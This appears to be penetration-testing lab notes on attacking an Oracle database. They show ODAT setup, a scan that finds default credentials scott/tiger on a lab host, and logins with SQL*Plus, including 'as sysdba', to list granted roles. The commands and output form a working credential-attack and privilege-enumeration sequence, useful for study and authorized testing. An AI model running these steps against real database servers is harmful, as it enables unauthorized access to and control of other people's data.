#### Oracle-Tools-setup.sh

```bash
#!/bin/bash

sudo apt-get install libaio1 python3-dev alien -y
git clone https://github.com/quentinhardy/odat.git
cd odat/
git submodule init
git submodule update
wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-basic-linux.x64-21.12.0.0.0dbru.zip
unzip instantclient-basic-linux.x64-21.12.0.0.0dbru.zip
wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip
unzip instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip
export LD_LIBRARY_PATH=instantclient_21_12:$LD_LIBRARY_PATH
export PATH=$LD_LIBRARY_PATH:$PATH
pip3 install cx_Oracle
sudo apt-get install python3-scapy -y
sudo pip3 install colorlog termcolor passlib python-libnmap
sudo apt-get install build-essential libgmp-dev -y
pip3 install pycryptodome
```


#### ODAT
```shell
./odat.py all -s 10.129.204.235

[+] Checking if target 10.129.204.235:1521 is well configured for a connection...
[+] According to a test, the TNS listener 10.129.204.235:1521 is well configured. Continue...

...SNIP...

[!] Notice: 'mdsys' account is locked, so skipping this username for password           #####################| ETA:  00:01:16 
[!] Notice: 'oracle_ocm' account is locked, so skipping this username for password       #####################| ETA:  00:01:05 
[!] Notice: 'outln' account is locked, so skipping this username for password           #####################| ETA:  00:00:59
[+] Valid credentials found: scott/tiger. Continue...

...SNIP...
```

#### SQLplus - Log In

```shel
sqlplus scott/tiger@10.129.204.235/XE

SQL*Plus: Release 21.0.0.0.0 - Production on Mon Mar 6 11:19:21 2023
Version 21.4.0.0.0

Copyright (c) 1982, 2021, Oracle. All rights reserved.

ERROR:
ORA-28002: the password will expire within 7 days

Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production

SQL> 
```

#### Oracle RDBMS - Database Enumeration
#sql
```shell
sqlplus scott/tiger@10.129.204.235/XE as sysdba

SQL*Plus: Release 21.0.0.0.0 - Production on Mon Mar 6 11:32:58 2023
Version 21.4.0.0.0

Copyright (c) 1982, 2021, Oracle. All rights reserved.


Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production


SQL> select * from user_role_privs;

USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SYS                            ADM_PARALLEL_EXECUTE_TASK      YES YES NO
SYS                            APEX_ADMINISTRATOR_ROLE        YES YES NO
SYS                            AQ_ADMINISTRATOR_ROLE          YES YES NO
SYS                            AQ_USER_ROLE                   YES YES NO
SYS                            AUTHENTICATEDUSER              YES YES NO
SYS                            CONNECT                        YES YES NO
SYS                            CTXAPP                         YES YES NO
SYS                            DATAPUMP_EXP_FULL_DATABASE     YES YES NO
SYS                            DATAPUMP_IMP_FULL_DATABASE     YES YES NO
SYS                            DBA                            YES YES NO
SYS                            DBFS_ROLE                      YES YES NO

USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SYS                            DELETE_CATALOG_ROLE            YES YES NO
SYS                            EXECUTE_CATALOG_ROLE           YES YES NO
...SNIP...
```